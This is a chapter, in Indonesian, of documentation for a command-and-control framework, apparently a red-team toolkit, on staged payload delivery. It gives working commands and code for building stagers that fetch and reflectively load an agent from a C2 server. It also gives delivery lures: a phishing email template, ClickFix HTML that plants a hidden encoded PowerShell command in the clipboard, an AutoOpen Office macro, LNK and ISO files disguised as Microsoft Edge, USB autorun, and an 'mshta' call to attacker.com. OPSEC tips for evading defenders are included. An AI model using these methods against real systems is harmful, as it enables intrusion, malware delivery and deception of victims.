# 09 — Stager & Delivery

## Konsep Staged vs Stageless

| Mode | Deskripsi | Ukuran | Kapan Dipakai |
|------|-----------|--------|---------------|
| **Stageless** | Agent full di-embed langsung ke payload delivery | 8-10 MB | USB drop, direct exec, lab |
| **Staged** | Stager kecil (loader) download agent dari C2 | 10-50 KB | Phishing, macro, jaringan terbatas |

**Staged flow:**
```
Phishing email
    │
    ▼
User klik → stager.exe/stager.ps1 (50KB)
    │
    │ HTTPS GET /stage/TOKEN
    ▼
C2 server mengirim agent terenkripsi
    │
    ▼
Stager decrypt + reflective load agent ke memory
    │
    ▼
Agent berjalan — tidak ada file agent di disk (fileless)
```

---

## Upload Agent ke Stage Server

Sebelum generate stager, upload agent ke stage server:

```bash
./bin/operator stage upload ./bin/agent_windows_stealth.exe \
  --server https://c2.corp.local:8000 \
  --format exe \
  --arch amd64 \
  --ttl 48 \
  --desc "engagement-phase1"
```

**Output:**
```
[+] Uploading agent (8.4 MB)...
[+] Stage registered.

    Token    : 6a69a21a750af40e983cf257b3d2e4a9
    URL      : https://c2.corp.local:8000/stage/6a69a21a750af40e983cf257b3d2e4a9
    Format   : exe (amd64)
    TTL      : 48 hours → expires 2026-04-25 09:15:00 UTC
    Desc     : engagement-phase1

[i] Token dapat dipakai sekali saja (one-time download).
```

### Parameter Upload

| Flag | Default | Keterangan |
|------|---------|------------|
| `--format` | `exe` | `exe`, `dll`, `shellcode` |
| `--arch` | `amd64` | `amd64`, `386` |
| `--ttl` | `24` | Jam sebelum token expired |
| `--desc` | kosong | Label untuk identifikasi |

### List Stage yang Tersedia

```bash
./bin/operator stage list --server https://c2.corp.local:8000
```

**Output:**
```
[+] Active stages:

TOKEN           FORMAT   ARCH   TTL     DESC
6a69a21a...     exe      amd64  46h23m  engagement-phase1
b2c3d4e5...     dll      amd64  23h45m  engagement-phase2-dll
```

---

## Generate Stager

### Format PowerShell (.ps1)

```bash
go run ./cmd/generate stager \
  --server https://c2.corp.local:8000 \
  --token 6a69a21a750af40e983cf257b3d2e4a9 \
  --key EnterpriseC2Key2026 \
  --format ps1 \
  --output stager.ps1
```

**Output:**
```
[+] Stager written: stager.ps1 (2.1 KB)
```

**Cara eksekusi:**
```powershell
# Dari PowerShell (butuh bypass execution policy)
powershell -ExecutionPolicy Bypass -File stager.ps1

# One-liner (encode dulu untuk bypass)
$b64 = [System.Convert]::ToBase64String([IO.File]::ReadAllBytes("stager.ps1"))
powershell -w hidden -ep bypass -enc $b64

# Dari command prompt
powershell -w hidden -ep bypass -f stager.ps1
```

**Isi stager.ps1 (konseptual):**
```powershell
$url = "https://c2.corp.local:8000/stage/TOKEN"
$key = [System.Convert]::FromBase64String("KEY_B64")
$r   = [System.Net.WebRequest]::Create($url)
$r.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
$data = $r.GetResponse().GetResponseStream() | % { ... }
# Decrypt AES-GCM
# Reflective load ke memory
[Reflection.Assembly]::Load($agent_bytes)
```

### Format Batch (.bat)

```bash
go run ./cmd/generate stager --format bat --output stager.bat ...
```

**Cara eksekusi:**
```cmd
# Klik dua kali atau jalankan dari cmd
stager.bat

# Dari command prompt
cmd /c stager.bat
```

### Format HTA (HTML Application)

```bash
go run ./cmd/generate stager --format hta --output stager.hta ...
```

**Cara eksekusi:**
```
# Double klik dari Windows Explorer → dialog konfirmasi muncul → klik "Run"
# Atau dari cmd:
mshta.exe stager.hta

# Atau via URL (hosting di web server):
mshta.exe http://attacker.com/stager.hta
```

**OPSEC note:** HTA menampilkan dialog keamanan di Windows 10+.
Untuk bypass dialog, gunakan ClickFix social engineering (user diminta copy-paste command).

### Format LNK (Windows Shortcut)

```bash
go run ./cmd/generate stager --format lnk --output "Microsoft Edge.lnk" ...
```

LNK bisa di-embed dalam ZIP/ISO yang dikirim via email.

**Target shortcut yang dibuat:**
```
Target: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Arguments: -w hidden -ep bypass -enc BASE64_STAGER
Icon: %ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe,0
```

### Format ISO

```bash
go run ./cmd/generate stager --format iso --output delivery.iso ...
```

ISO berisi:
```
delivery.iso
├── Microsoft Edge (Double Click to Open).lnk  ← shortcut ke stager
└── setup.exe                                  ← decoy file
```

User mount ISO → klik shortcut → stager jalan.

### Format EXE (Stageless Dropper)

```bash
go run ./cmd/generate stager --format exe --output setup.exe ...
```

Binary EXE yang langsung embed stager code.

---

## Delivery Methods

### 1. Phishing Email (Attachment)

Kirim `stager.ps1` atau ISO/ZIP via email phishing:

```
Subject: Urgent: Update Your VPN Certificate
Body   : Your VPN certificate needs to be updated. 
         Please run the attached tool to update it.
Attach : VPN_Certificate_Update.lnk  (LNK ke stager)
```

### 2. ClickFix (No-Attachment Phishing)

Tampilkan halaman web dengan instruksi "copy-paste command untuk fix error":

```html
<!-- Halaman phishing -->
<script>
  navigator.clipboard.writeText(
    'powershell -w hidden -ep bypass -enc BASE64_STAGER_HERE'
  );
</script>
<p>Error detected! Press Win+R, type "powershell" and press Enter,
   then paste the command (Ctrl+V) and press Enter to fix.</p>
```

### 3. Macro Word/Excel

```vba
' AutoOpen macro di Word/Excel
Sub AutoOpen()
    Shell "powershell -w hidden -ep bypass -enc BASE64_STAGER"
End Sub
```

### 4. USB Drop

```bash
# Salin agent stealth ke USB
cp bin/agent_windows_stealth.exe /media/usb/SystemUpdate.exe

# Atau buat autorun (legacy systems)
echo "[AutoRun]" > /media/usb/autorun.inf
echo "open=SystemUpdate.exe" >> /media/usb/autorun.inf
```

### 5. Supply Chain / Trojanized Installer

Inject agent ke installer legitimate menggunakan resource patcher:

```bash
# Konseptual — tidak ada built-in support
# Gunakan tools seperti: ResourceHacker, Peshield, InjectPE
```

---

## Stage Management

### Hapus Stage (Token Invalidation)

```bash
./bin/operator stage delete TOKEN --server https://c2.corp.local:8000
# [+] Stage TOKEN deleted. URL tidak bisa diakses lagi.
```

### Lihat Berapa Kali Didownload

```bash
./bin/operator stage info TOKEN --server https://c2.corp.local:8000
```

**Output:**
```
[+] Stage info:

    Token     : 6a69a21a...
    Format    : exe (amd64)
    Size      : 8,421,376 bytes
    Downloads : 1 (one-time token → now invalid)
    Created   : 2026-04-23 09:15:00 UTC
    Expires   : 2026-04-25 09:15:00 UTC
    Desc      : engagement-phase1
```

---

## OPSEC untuk Stager

**Gunakan HTTPS:** Stager yang mendownload via HTTP bisa di-intercept.

**TTL minimal:** Set TTL sesuai kebutuhan (bukan 24h jika hanya butuh 1 jam).

**One-time token:** Token default hanya bisa didownload sekali — agent delivery URL
yang sama tidak bisa dipakai dua kali (cegah replay oleh defender).

**User-Agent:** Stager menggunakan User-Agent browser legitimate untuk hindari
deteksi proxy yang filter UA aneh.

---

**Selanjutnya:** [10 — Process Injection](10-injection.md)
